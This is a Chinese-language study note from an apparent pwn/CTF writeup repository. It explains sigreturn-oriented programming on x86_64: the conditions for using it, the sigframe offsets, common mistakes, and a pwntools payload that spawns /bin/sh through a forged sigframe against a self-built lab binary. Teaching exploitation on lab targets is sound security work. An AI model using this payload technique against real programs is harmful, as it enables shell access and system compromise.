# srop

> 共同模式特征：**`rax=15` + `syscall` 触发 `rt_sigreturn`，用一份伪造的 sigframe
> 一次性把全部寄存器设好**。适合"有 `syscall` 却没有传参 gadget、也没有 libc"的场景。

---

## 1. 模式特征

```text
NX 开启（栈不可执行，排除 ret2shellcode）
+ 没有 libc / 没有 pop rdi / pop rsi / pop rdx（常规 ROP 传不出参数）
+ 但二进制里有 `syscall; ret`，且能把 rax 置成 15
= srop
```

判定时先看两条硬条件：

| 条件 | 检查方法 |
| --- | --- |
| 有 `syscall`（或 `int 0x80`）且后面能 `ret` | `ROPgadget --only "syscall|ret"` / `objdump -d` |
| 能控制 `rax` | 找 `pop rax; ret`，或 `read` 的返回值本身 |

`rax=15` 在 x86_64 上是 `rt_sigreturn`；内核看到这个系统调用号后，会把**当前栈指针
指向的数据**当成 `struct rt_sigframe` 解析，按 `sigcontext` 还原所有通用寄存器
（包括 `rip`、`rsp`），然后从伪造的 `rip` 继续执行。这等价于"一次设置全部寄存器"。

与相邻模式的边界：

| 模式 | 传参方式 | 适用前提 |
| --- | --- | --- |
| `ret2libc` | `pop rdi/rsi/rdx` + libc 函数 | 需要 leak libc |
| `ret2text` | 跳到现成后门 | 二进制里有完整调用 |
| `stack_pivot` | 先换栈再摆长链 | 溢出字节不够 |
| **`srop`** | **sigframe 一次设全部寄存器** | 只有 `syscall` + `pop rax`，没有传参 gadget |

---

## 2. x86_64 sigframe 布局

pwntools 的 `SigreturnFrame()` 已经封装好，`len(bytes(frame)) == 0xf8`（248 字节）。
手工定位时常用字段偏移如下（`context.arch = 'amd64'`）：

| 字段 | 偏移 | 字段 | 偏移 |
| --- | --- | --- | --- |
| `r8` | `0x28` | `rdx` | `0x88` |
| `r9` | `0x30` | `rax` | `0x90` |
| `r10` | `0x38` | `rcx` | `0x98` |
| `r11` | `0x40` | **`rsp`** | **`0xa0`** |
| `r12` | `0x48` | **`rip`** | **`0xa8`** |
| `r13` | `0x50` | `eflags` | `0xb0` |
| `r14` | `0x58` | `csgsfs` | `0xb8` |
| `r15` | `0x60` | `err` | `0xc0` |
| **`rdi`** | **`0x68`** | `trapno` | `0xc8` |
| **`rsi`** | **`0x70`** | `oldmask` | `0xd0` |
| `rbp` | `0x78` | `cr2` | `0xd8` |
| `rbx` | `0x80` | 总长 | `0xf8` |

最小链的形状（64 位）：

```text
p64(pop_rax_ret) + p64(15) + p64(syscall_ret) + bytes(SigreturnFrame(...))
```

执行语义：

```text
ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
内核按 sigframe 还原：rax / rdi / rsi / rdx / rip / rsp 全部生效
-> 从 frame.rip 继续；若 frame.rip 也是 syscall;ret，就直接执行 frame.rax 指定的系统调用
```

> 32 位（i386）差异：系统调用号是 `eax=119`（`sigreturn`），触发指令是 `int 0x80`，
> frame 长度 `0x5c`；pwntools 设 `context.arch = 'i386'` 后同样是 `SigreturnFrame()`。

---

## 3. 本模式题目

| 题目 | 架构 / 链接 | 为什么只能 SROP | 关键地址 |
| --- | --- | --- | --- |
| `L1_lab_srop_baby`（自造） | x86_64 / 静态汇编 / 无 libc | NX 开启；只有 `syscall;ret` + `pop rax;ret`，无 `pop rdi/rsi/rdx` | `syscall;ret=0x401065`、`pop rax;ret=0x401068`、`bss=0x403010` |

题目源码与说明：`labs/lab_srop_baby/`（`src/chal.S` + `Makefile` + `exp.py` + `README.md`）。
该题属于自造实验，用来在没有外部 libc / 附件依赖的前提下把 `rt_sigreturn` 跑通。

典型利用（`execve("/bin/sh", 0, 0)`）：

```python
frame = SigreturnFrame()
frame.rax = 59            # execve
frame.rdi = BSS_BUF       # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_RET   # sigreturn 之后再次 syscall
frame.rsp = BSS_BUF + 0x80

payload = p64(POP_RAX_RET) + p64(15) + p64(SYSCALL_RET) + bytes(frame)
```

---

## 4. 运行

```bash
cd '/home/yfhd5/Pwn Writeups/labs/lab_srop_baby'
make                       # as + ld，无 libc 依赖
python exp.py              # 仓库 .venv 内的 pwntools
```

预期输出：

```text
[*] payload: 272 bytes
__PWNED__
uid=... gid=...
```

---

## 5. 常见误区

1. **sigframe 里忘了设 `rip`**：`rip` 默认是 0，sigreturn 之后直接段错误。
   通常把它设成 `syscall; ret`，再让 `rax` 指向真正想做的系统调用。
2. **`rax=15` 后中间又插了别的 gadget**：`rt_sigreturn` 必须紧接着执行，
   否则内核解析的栈位置就错了。
3. **frame 被截断**：`read` 的长度必须 ≥ `3*8 + 0xf8 = 0x110`（272）字节，
   否则 sigframe 不完整，寄存器还原出垃圾值。
4. **把 SROP 当万能钥匙**：如果能凑出 `pop rdi/rsi/rdx`，普通 ROP 更短更稳；
   SROP 是"缺 gadget"时的替代方案，不是首选。
5. **静态汇编靶场忘了 `.note.GNU-stack`**：不写这一行 `ld` 不生成 `PT_GNU_STACK`，
   内核可能给可执行栈，题目就退化成 `ret2shellcode` 了（见 `labs/lab_srop_baby`）。
